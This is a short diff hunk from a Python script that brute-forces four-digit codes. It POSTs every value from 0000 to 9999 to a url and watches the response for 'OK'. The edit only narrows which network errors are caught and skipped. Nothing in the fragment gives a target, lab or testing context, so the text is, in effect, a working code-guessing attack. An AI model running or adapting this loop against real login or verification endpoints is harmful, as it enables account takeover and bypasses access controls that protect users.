@@ -29,7 +29,7 @@ for i in range(10000):
     code=f'{i:04d}'
     try:
         r=requests.post(url,data={'code':code},timeout=3)
-    except requests.RequestException as exc:
+    except (requests.ConnectionError, requests.Timeout) as exc:
         print('Network error:', exc)
         continue
     if 'OK' in r.text:
